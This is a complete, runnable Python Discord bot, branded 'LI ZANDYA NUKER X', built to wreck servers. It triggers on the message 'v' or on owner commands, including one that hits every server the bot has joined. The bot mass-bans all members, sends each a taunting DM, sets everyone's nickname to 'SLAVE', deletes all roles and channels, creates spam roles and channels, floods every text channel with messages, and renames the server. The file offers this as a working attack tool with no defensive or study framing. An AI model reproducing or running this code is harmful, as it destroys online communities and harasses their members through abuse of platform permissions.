#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║     💀 LI ZANDYA NUKER X - DISCORD SERVER DESTROYER 💀                                                                                   ║
║                    TYPE "v" = INSTANT BAN ALL + TOTAL DESTRUCTION                                                                       ║
║                    👑 POWERED BY LI ZANDYA MAFIA 👑                                                                                     ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

import discord
from discord.ext import commands
import asyncio
import random
import time
import os
import sys
import threading
from datetime import datetime

TOKEN = None
OWNER_ID = None
NUKE_TRIGGER = "v"

MAX_THREADS = 5000
DM_DELAY = 0.001

# رسالة خاصة لكل عضو
DM_MESSAGE = """
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║     ██╗  ██╗███████╗                                                ║
║     ██║ ██╔╝██╔════╝                                                ║
║     █████╔╝ ███████╗                                                ║
║     ██╔═██╗ ╚════██║                                                ║
║     ██║  ██╗███████║                                                ║
║     ╚═╝  ╚═╝╚══════╝                                                ║
║                                                                      ║
║     💀 YOU HAVE BEEN TERMINATED BY LI ZANDYA MAFIA 💀                ║
║     🔥 YOUR SERVER IS NOW COMPLETELY DESTROYED 🔥                    ║
║     👑 LI ZANDYA MAFIA CONTROLS EVERYTHING 👑                        ║
║                                                                      ║
║     🐉 THIS IS THE POWER OF LI ZANDYA 🐉                             ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

class UltimateNuker:
    def __init__(self):
        self.total_banned = 0
        self.total_dm_sent = 0
        self.total_channels_deleted = 0
        self.total_roles_deleted = 0
        self.total_spam_sent = 0
        self.nuked_servers = []
        self.is_nuking = False
        self.start_time = None
        
    async def ban_all_members_first(self, guild):
        """الخطوة 1: حظر جميع الأعضاء أولاً"""
        members = [m for m in guild.members if not m.bot and m != guild.owner]
        success = 0
        fail = 0
        
        def ban_worker(member):
            nonlocal success, fail
            try:
                future = asyncio.run_coroutine_threadsafe(member.ban(reason="LI ZANDYA MAFIA - TOTAL ANNIHILATION"), bot.loop)
                future.result(timeout=2)
                success += 1
                print(f"[BAN] Banned: {member.name}")
            except Exception as e:
                fail += 1
                print(f"[BAN] Failed: {member.name} - {e}")
        
        threads = []
        for member in members:
            t = threading.Thread(target=ban_worker, args=(member,))
            t.start()
            threads.append(t)
            time.sleep(0.0005)  # سرعة خارقة
            
            if len(threads) >= MAX_THREADS:
                for t in threads[:500]:
                    t.join(timeout=0.01)
                threads = []
        
        for t in threads:
            t.join(timeout=0.01)
        
        self.total_banned += success
        return success, fail
    
    async def mass_dm_everyone(self, guild):
        """الخطوة 2: إرسال رسائل للجميع"""
        members = [m for m in guild.members if not m.bot]
        success = 0
        fail = 0
        
        def send_worker(member):
            nonlocal success, fail
            try:
                future = asyncio.run_coroutine_threadsafe(member.send(DM_MESSAGE), bot.loop)
                future.result(timeout=1)
                success += 1
            except:
                fail += 1
        
        threads = []
        for member in members:
            t = threading.Thread(target=send_worker, args=(member,))
            t.start()
            threads.append(t)
            time.sleep(DM_DELAY)
            
            if len(threads) >= MAX_THREADS:
                for t in threads[:500]:
                    t.join(timeout=0.01)
                threads = []
        
        for t in threads:
            t.join(timeout=0.01)
        
        self.total_dm_sent += success
        return success, fail
    
    async def delete_all_channels(self, guild):
        """حذف جميع القنوات"""
        count = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                count += 1
            except:
                pass
        self.total_channels_deleted += count
        return count
    
    async def delete_all_roles(self, guild):
        """حذف جميع الرتب"""
        count = 0
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    count += 1
                except:
                    pass
        self.total_roles_deleted += count
        return count
    
    async def create_spam_channels(self, guild):
        """إنشاء قنوات سبام باسم LI ZANDYA"""
        channels = []
        spam_names = [
            "li-zandya-mafia", "destroyed-by-li-zandya", "li-zandya-was-here",
            "zandya-destroyer", "li-zandya-nuker", "zandya-mafia",
            "li-zandya-rules", "destroyed-zandya", "zandya-annihilation",
            "li-zandya-power"
        ]
        for i in range(150):
            try:
                name = random.choice(spam_names) + f"-{random.randint(1,999)}"
                channel = await guild.create_text_channel(name)
                channels.append(channel)
            except:
                pass
        return channels
    
    async def spam_all_channels(self, guild):
        """سبام في جميع القنوات باسم LI ZANDYA"""
        spam_messages = [
            "💀💀💀 LI ZANDYA MAFIA WAS HERE 💀💀💀",
            "🔥🔥🔥 SERVER DESTROYED BY LI ZANDYA 🔥🔥🔥",
            "👑👑👑 LI ZANDYA MAFIA CONTROLS EVERYTHING 👑👑👑",
            "💀💀💀 TOTAL ANNIHILATION BY LI ZANDYA 💀💀💀",
            "🐉🐉🐉 LI ZANDYA THE DESTROYER 🐉🐉🐉",
            "💀 ZANDYA NUKE COMPLETE 💀",
            "🔥 LI ZANDYA = ABSOLUTE POWER 🔥",
            "👑 ALL HAIL LI ZANDYA MAFIA 👑",
            "💀 YOUR SERVER IS NOW LI ZANDYA TERRITORY 💀",
            "🔥 DESTROYED BY ZANDYA NUKE 🔥"
        ]
        total = 0
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                for _ in range(50):
                    try:
                        msg = random.choice(spam_messages) + f" | {random.randint(1,999999)}"
                        await channel.send(msg)
                        total += 1
                        self.total_spam_sent += 1
                        await asyncio.sleep(0.005)
                    except:
                        pass
        return total
    
    async def rename_server(self, guild):
        """تغيير اسم السيرفر"""
        try:
            await guild.edit(name="💀 DESTROYED BY LI ZANDYA MAFIA 💀")
        except:
            pass
    
    async def change_all_nicknames(self, guild):
        """تغيير أسماء جميع الأعضاء"""
        count = 0
        for member in guild.members:
            if not member.bot:
                try:
                    await member.edit(nick="💀 LI ZANDYA SLAVE 💀")
                    count += 1
                except:
                    pass
        return count
    
    async def create_spam_roles(self, guild):
        """إنشاء رتب سبام"""
        count = 0
        role_names = [
            "LI ZANDYA", "DESTROYED", "NUKE", "ZANDYA MAFIA",
            "DEATH", "ANNIHILATION", "POWER", "DARKNESS"
        ]
        for i in range(50):
            try:
                name = random.choice(role_names) + f"-{i}"
                await guild.create_role(name=name)
                count += 1
            except:
                pass
        return count
    
    async def ultimate_nuke(self, guild):
        """نوكر شامل - الخطوات بالترتيب"""
        if self.is_nuking:
            return None
        
        self.is_nuking = True
        results = {
            'banned': 0,
            'banned_failed': 0,
            'dm_sent': 0,
            'dm_failed': 0,
            'channels_deleted': 0,
            'roles_deleted': 0,
            'spam_roles_created': 0,
            'spam_channels': 0,
            'spam_messages': 0,
            'nicknames_changed': 0
        }
        
        try:
            print(f"\n{'='*60}")
            print(f"[NUKE] LI ZANDYA NUKER ACTIVATED ON: {guild.name}")
            print(f"[NUKE] Total Members: {len(guild.members)}")
            print(f"{'='*60}\n")
            
            # ========== الخطوة 1: حظر جميع الأعضاء أولاً ==========
            print("[STEP 1] BANNING ALL MEMBERS...")
            results['banned'], results['banned_failed'] = await self.ban_all_members_first(guild)
            print(f"[STEP 1] COMPLETE! Banned: {results['banned']} members\n")
            
            # ========== الخطوة 2: إرسال رسائل للجميع ==========
            print("[STEP 2] SENDING MASS DMS...")
            results['dm_sent'], results['dm_failed'] = await self.mass_dm_everyone(guild)
            print(f"[STEP 2] COMPLETE! DM Sent: {results['dm_sent']}\n")
            
            # ========== الخطوة 3: تغيير أسماء الأعضاء ==========
            print("[STEP 3] CHANGING ALL NICKNAMES...")
            results['nicknames_changed'] = await self.change_all_nicknames(guild)
            print(f"[STEP 3] COMPLETE! Nicknames changed: {results['nicknames_changed']}\n")
            
            # ========== الخطوة 4: حذف جميع الرتب ==========
            print("[STEP 4] DELETING ALL ROLES...")
            results['roles_deleted'] = await self.delete_all_roles(guild)
            print(f"[STEP 4] COMPLETE! Roles deleted: {results['roles_deleted']}\n")
            
            # ========== الخطوة 5: إنشاء رتب سبام ==========
            print("[STEP 5] CREATING SPAM ROLES...")
            results['spam_roles_created'] = await self.create_spam_roles(guild)
            print(f"[STEP 5] COMPLETE! Spam roles created: {results['spam_roles_created']}\n")
            
            # ========== الخطوة 6: حذف جميع القنوات ==========
            print("[STEP 6] DELETING ALL CHANNELS...")
            results['channels_deleted'] = await self.delete_all_channels(guild)
            print(f"[STEP 6] COMPLETE! Channels deleted: {results['channels_deleted']}\n")
            
            # ========== الخطوة 7: إنشاء قنوات سبام ==========
            print("[STEP 7] CREATING SPAM CHANNELS...")
            spam_channels = await self.create_spam_channels(guild)
            results['spam_channels'] = len(spam_channels)
            print(f"[STEP 7] COMPLETE! Spam channels created: {results['spam_channels']}\n")
            
            # ========== الخطوة 8: سبام في جميع القنوات ==========
            print("[STEP 8] SPAMMING ALL CHANNELS...")
            results['spam_messages'] = await self.spam_all_channels(guild)
            print(f"[STEP 8] COMPLETE! Spam messages sent: {results['spam_messages']}\n")
            
            # ========== الخطوة 9: تغيير اسم السيرفر ==========
            print("[STEP 9] RENAMING SERVER...")
            await self.rename_server(guild)
            print(f"[STEP 9] COMPLETE! Server renamed\n")
            
            self.nuked_servers.append(guild.name)
            
            print(f"\n{'='*60}")
            print(f"[NUKE] LI ZANDYA NUKE COMPLETED ON: {guild.name}")
            print(f"[NUKE] Total Banned: {results['banned']}")
            print(f"[NUKE] Total DM Sent: {results['dm_sent']}")
            print(f"[NUKE] Total Spam: {results['spam_messages']}")
            print(f"{'='*60}\n")
            
        except Exception as e:
            print(f"Error during nuke: {e}")
        finally:
            self.is_nuking = False
        
        return results

nuker = UltimateNuker()

# ============================================
# DISCORD BOT
# ============================================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.guild_messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

@bot.event
async def on_ready():
    try:
        await bot.user.edit(username="💀 LI ZANDYA NUKER 💀")
    except:
        pass
    
    await bot.change_presence(activity=discord.Game(name="💀 TYPE v TO NUKE 💀"))
    
    try:
        await bot.user.edit(bio="🔨 LI ZANDYA MAFIA - DISCORD DESTROYER 🔨")
    except:
        pass
    
    nuker.start_time = time.time()
    
    print(f"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                          ║
║     💀 LI ZANDYA NUKER X - ACTIVATED 💀                                                                                                   ║
║                                                                                                                                          ║
║  🤖 BOT NAME: 💀 LI ZANDYA NUKER 💀                                                                                                       ║
║  📡 SERVERS: {len(bot.guilds)}                                                                                                          ║
║  👥 TOTAL MEMBERS: {sum(g.member_count for g in bot.guilds)}                                                                          ║
║                                                                                                                                          ║
║  ⚡ TRIGGER: Type "v" in ANY server = INSTANT TOTAL DESTRUCTION ⚡                                                                        ║
║  💀 FIRST USER = MASTER OWNER 💀                                                                                                         ║
║  🔥 EVERYTHING WILL BE SPAMMED WITH LI ZANDYA NAME 🔥                                                                                     ║
║                                                                                                                                          ║
║  📋 NUKE STEPS:                                                                                                                          ║
║  1️⃣ BAN ALL MEMBERS FIRST                                                                                                              ║
║  2️⃣ MASS DM EVERYONE                                                                                                                   ║
║  3️⃣ CHANGE ALL NICKNAMES                                                                                                               ║
║  4️⃣ DELETE ALL ROLES                                                                                                                   ║
║  5️⃣ CREATE SPAM ROLES                                                                                                                  ║
║  6️⃣ DELETE ALL CHANNELS                                                                                                                ║
║  7️⃣ CREATE SPAM CHANNELS                                                                                                               ║
║  8️⃣ SPAM EVERY CHANNEL                                                                                                                 ║
║  9️⃣ RENAME SERVER                                                                                                                      ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    print("\n💀 LI ZANDYA NUKER IS READY - WAITING FOR 'v'... 💀\n")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    global OWNER_ID
    
    if OWNER_ID is None:
        OWNER_ID = message.author.id
        print(f"\n👑 MASTER OWNER SET: {message.author} (ID: {OWNER_ID})\n")
        await message.channel.send("```👑 YOU ARE NOW THE LI ZANDYA MASTER OWNER!\n💀 Type 'v' in any server to destroy it completely!```")
        return
    
    if message.author.id == OWNER_ID and message.content.startswith('!'):
        await handle_owner_command(message)
        return
    
    if message.content.lower().strip() == NUKE_TRIGGER:
        guild = message.guild
        if guild and not nuker.is_nuking:
            print(f"\n💀💀💀 LI ZANDYA NUKE TRIGGERED in {guild.name} by {message.author} 💀💀💀\n")
            await message.channel.send("```🔥 LI ZANDYA NUKE ACTIVATED!\n📋 Steps:\n1️⃣ Banning all members...\n2️⃣ Sending mass DMs...\n3️⃣ Destroying everything...\n\n💀 TOTAL DESTRUCTION IN PROGRESS 💀```")
            results = await nuker.ultimate_nuke(guild)
            if results:
                await message.channel.send(f"""```
💀 LI ZANDYA NUKE COMPLETE! 💀

✅ Banned: {results['banned']} members
✅ DM Sent: {results['dm_sent']} members
✅ Nicknames Changed: {results['nicknames_changed']}
✅ Roles Deleted: {results['roles_deleted']}
✅ Spam Roles Created: {results['spam_roles_created']}
✅ Channels Deleted: {results['channels_deleted']}
✅ Spam Channels Created: {results['spam_channels']}
✅ Spam Messages Sent: {results['spam_messages']}

🔥 SERVER COMPLETELY DESTROYED BY LI ZANDYA MAFIA 🔥
```""")

async def handle_owner_command(message):
    content = message.content.lower()
    
    if content == '!servers':
        if not bot.guilds:
            await message.channel.send("No servers!")
            return
        server_list = []
        for i, guild in enumerate(bot.guilds, 1):
            server_list.append(f"{i}. {guild.name} | Members: {guild.member_count}")
        chunks = [server_list[i:i+20] for i in range(0, len(server_list), 20)]
        for chunk in chunks:
            await message.channel.send("```yaml\n" + "\n".join(chunk) + "\n```")
    
    elif content.startswith('!nuke-server'):
        try:
            parts = content.split()
            if len(parts) < 2:
                await message.channel.send("Usage: !nuke-server <number>")
                return
            number = int(parts[1])
            if number < 1 or number > len(bot.guilds):
                await message.channel.send(f"Invalid! Choose 1-{len(bot.guilds)}")
                return
            guild = bot.guilds[number - 1]
            await message.channel.send(f"💀 NUKING {guild.name}...")
            results = await nuker.ultimate_nuke(guild)
            if results:
                await message.channel.send(f"✅ DESTROYED! Banned: {results['banned']}")
        except:
            await message.channel.send("Invalid number!")
    
    elif content == '!nuke':
        if message.guild:
            await message.channel.send(f"💀 NUKING {message.guild.name}...")
            results = await nuker.ultimate_nuke(message.guild)
            if results:
                await message.channel.send(f"✅ DESTROYED! Banned: {results['banned']}")
    
    elif content == '!nuke-all':
        await message.channel.send(f"💀 GLOBAL NUKE ON {len(bot.guilds)} SERVERS...")
        total_banned = 0
        for guild in bot.guilds:
            results = await nuker.ultimate_nuke(guild)
            if results:
                total_banned += results['banned']
        await message.channel.send(f"✅ COMPLETE! Total Banned: {total_banned}")
    
    elif content == '!stats':
        elapsed = time.time() - nuker.start_time if nuker.start_time else 0
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        await message.channel.send("```")
        await message.channel.send("╔══════════════════════════════════════════════════════════╗")
        await message.channel.send("║         LI ZANDYA NUKER - STATISTICS                     ║")
        await message.channel.send("╠══════════════════════════════════════════════════════════╣")
        await message.channel.send(f"║  🎯 SERVERS DESTROYED: {len(nuker.nuked_servers)}")
        await message.channel.send(f"║  🔨 TOTAL BANNED: {nuker.total_banned:,}")
        await message.channel.send(f"║  📨 TOTAL DM SENT: {nuker.total_dm_sent:,}")
        await message.channel.send(f"║  🗑️ CHANNELS DELETED: {nuker.total_channels_deleted:,}")
        await message.channel.send(f"║  👑 ROLES DELETED: {nuker.total_roles_deleted:,}")
        await message.channel.send(f"║  💬 SPAM SENT: {nuker.total_spam_sent:,}")
        await message.channel.send(f"║  ⏱️ UPTIME: {hours}h {minutes}m")
        await message.channel.send("╠══════════════════════════════════════════════════════════╣")
        await message.channel.send("║  💀 LI ZANDYA MAFIA - ABSOLUTE POWER 💀")
        await message.channel.send("╚══════════════════════════════════════════════════════════╝")
        await message.channel.send("```")
    
    elif content == '!help':
        await message.channel.send("```")
        await message.channel.send("💀 LI ZANDYA NUKER X - COMMANDS 💀")
        await message.channel.send("")
        await message.channel.send("!servers           - Show all servers with numbers")
        await message.channel.send("!nuke-server <num> - Destroy server by number")
        await message.channel.send("!nuke              - Destroy current server")
        await message.channel.send("!nuke-all          - Destroy all servers")
        await message.channel.send("!stats             - Show statistics")
        await message.channel.send("!help              - Show this help")
        await message.channel.send("")
        await message.channel.send("⚡ TRIGGER: Type 'v' in ANY server = INSTANT TOTAL DESTRUCTION!")
        await message.channel.send("💀 FIRST USER = MASTER OWNER")
        await message.channel.send("🔥 EVERYTHING WILL BE SPAMMED WITH LI ZANDYA NAME 🔥")
        await message.channel.send("```")

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
    ║                                                                                                                                          ║
    ║     💀 LI ZANDYA NUKER X - ULTIMATE DISCORD DESTROYER 💀                                                                                 ║
    ║                                                                                                                                          ║
    ║  ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ║  🔥 HOW TO USE:                                                                                                                  ║  ║
    ║  ║  • Type "v" in ANY server = INSTANT TOTAL DESTRUCTION                                                                           ║  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ║  📋 WHAT HAPPENS WHEN YOU TYPE "v":                                                                                              ║  ║
    ║  ║  1️⃣ BAN ALL MEMBERS - حظر جميع الأعضاء أولاً                                                                                     ║  ║
    ║  ║  2️⃣ MASS DM EVERYONE - إرسال رسائل للجميع                                                                                       ║  ║
    ║  ║  3️⃣ CHANGE ALL NICKNAMES - تغيير أسماء الجميع إلى LI ZANDYA SLAVE                                                               ║  ║
    ║  ║  4️⃣ DELETE ALL ROLES - حذف جميع الرتب                                                                                           ║  ║
    ║  ║  5️⃣ CREATE SPAM ROLES - إنشاء رتب سبام باسم LI ZANDYA                                                                          ║  ║
    ║  ║  6️⃣ DELETE ALL CHANNELS - حذف جميع القنوات                                                                                      ║  ║
    ║  ║  7️⃣ CREATE SPAM CHANNELS - إنشاء قنوات سبام باسم LI ZANDYA                                                                     ║  ║
    ║  ║  8️⃣ SPAM EVERY CHANNEL - سبام في كل القنوات باسم LI ZANDYA                                                                     ║  ║
    ║  ║  9️⃣ RENAME SERVER - تغيير اسم السيرفر إلى DESTROYED BY LI ZANDYA                                                               ║  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ║  💀 FIRST USER = MASTER OWNER 💀                                                                                                 ║  ║
    ║  ║  🔥 EVERYTHING WILL BE SPAMMED WITH "LI ZANDYA" NAME 🔥                                                                          ║  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ║  🐉 LI ZANDYA MAFIA - TOTAL DESTRUCTION 🐉                                                                                       ║  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝  ║
    ║                                                                                                                                          ║
    ║  🔑 ENTER YOUR BOT TOKEN:                                                                                                               ║
    ║                                                                                                                                          ║
    ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    TOKEN = input("\n🔑 Token: ").strip()
    if not TOKEN:
        print("No token!")
        sys.exit(1)
    
    print("\n✅ LI ZANDYA NUKER ACTIVATED!\n")
    print("💀 Type 'v' in ANY server = INSTANT TOTAL DESTRUCTION 💀\n")
    print("👑 First user = Master Owner\n")
    
    bot.run(TOKEN)
